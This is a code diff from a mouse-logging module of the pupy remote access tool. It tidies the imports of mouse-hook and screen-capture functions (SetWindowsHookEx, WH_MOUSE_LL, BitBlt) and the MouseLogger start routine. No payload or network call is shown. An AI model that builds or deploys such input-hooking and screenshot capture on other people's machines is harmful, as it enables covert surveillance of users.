@@ -1,15 +1,25 @@
 # Mostly stolen from Nicolas VERDIER (contact@n1nj4.eu)
 # Mostly stolen and recreated by golind
-import sys
 
-import threading
 import time
 import datetime
-import struct
 
 from png import bmp_to_png
 
-from hookfuncs import *
+from hookfuncs import (
+    MSG, SetTimer, GetMessageW,
+    byref, KillTimer, get_mouse_xy,
+    GetSystemMetrics,
+    SM_CXVIRTUALSCREEN, SM_XVIRTUALSCREEN,
+    SM_CYVIRTUALSCREEN, SM_YVIRTUALSCREEN,
+    GetWindowDC, CreateCompatibleDC, SelectObject,
+    BitBlt, SRCCOPY, BITMAPINFO, sizeof,
+    BITMAPINFOHEADER, create_string_buffer,
+    GetDIBits, pointer, DIB_RGB_COLORS, DeleteObject,
+    HOOKPROC, SetWindowsHookEx, WH_MOUSE_LL,
+    GetModuleHandleW, UnhookWindowsHookEx,
+    get_current_process, CallNextHookEx, CreateCompatibleBitmap
+)
 
 import pupy
 
@@ -20,7 +30,7 @@ def mouselogger_start():
         return False
 
     try:
-        mouselogger = pupy.manager.create(MouseLogger)
+        pupy.manager.create(MouseLogger)
     except:
         return False
 
